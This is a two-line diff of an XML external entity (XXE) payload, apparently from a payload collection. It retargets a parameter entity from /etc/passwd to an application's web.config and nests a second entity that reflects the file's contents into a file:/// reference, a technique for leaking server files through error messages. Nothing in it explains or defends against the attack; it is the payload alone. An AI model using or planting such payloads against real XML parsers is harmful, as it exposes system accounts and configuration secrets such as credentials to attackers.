@@ -1,2 +1,2 @@
-<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % three SYSTEM "file:///E:/approot/web.config">
 <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
